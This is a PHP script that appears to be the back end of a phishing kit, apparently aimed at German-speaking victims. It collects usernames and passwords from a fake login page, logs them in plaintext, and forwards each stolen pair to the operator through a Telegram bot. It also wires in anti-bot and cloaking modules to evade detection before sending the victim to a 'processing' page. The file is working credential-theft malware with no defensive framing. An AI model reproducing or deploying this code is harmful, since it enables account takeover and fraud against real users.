<?php
session_start();

// Include Telegram configuration and captcha
include './config/telegram.php';
include './captcha.php';

// For local testing - bypass anti-bot protection
$bypass_antibot = true;

if (!$bypass_antibot) {
    // Include security files
    include './antibot.php';
    include './antibot/tds.php';
    include './prevents/genius.php';
    include './antibot/tds.php';
    include './prevents/anti.php';
    include './prevents/anti2.php';
    include './prevents/sub_anti.php';
    include './prevents/block.php';
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['xusr'] ?? '';
    $password = $_POST['xpss'] ?? '';
    $captcha_answer = $_POST['captcha'] ?? '';
    
    // Verify captcha
    if (!verifyCaptcha($captcha_answer)) {
        // Captcha failed - redirect back to login with error
        $_SESSION['captcha_error'] = true;
        header("Location: ./views/loginz.php");
        exit;
    }
    
    // Log the login attempt
    $log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'username' => $username,
        'password' => $password
    ];
    
    // Save to log file
    $log_file = './logs/login_attempts.log';
    $log_entry = json_encode($log_data) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // Update stats
    $stats_file = './app/Panel/stats/stats.ini';
    $stats = @parse_ini_file($stats_file);
    if (!$stats) {
        $stats = ['visitors' => 0, 'bots' => 0, 'logins' => 0, 'successful_logins' => 0];
    }
    $stats['logins']++;
    $stats['successful_logins']++;
    file_put_contents($stats_file, "[stats]\nvisitors = {$stats['visitors']}\nbots = {$stats['bots']}\nlogins = {$stats['logins']}\nsuccessful_logins = {$stats['successful_logins']}\n");
    
    // Telegram Bot 2 - Form submission notification
    if ($enable_telegram) {
        $message = "📝 <b>Neue Anmeldedaten erhalten!</b>\n\n";
        $message .= "👤 <b>Benutzername:</b> $username\n";
        $message .= "🔐 <b>Passwort:</b> $password\n";
        $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
        $message .= "🕒 <b>Zeit:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌍 <b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        
        sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $message);
    }
    
    // Store data in session for processing page
    $_SESSION['login_data'] = $log_data;
    
    // Redirect to processing page
    header("Location: ./views/processing.php");
    exit;
} else {
    // If accessed directly, redirect to login page
    header("Location: ./views/loginz.php");
    exit;
}
?>
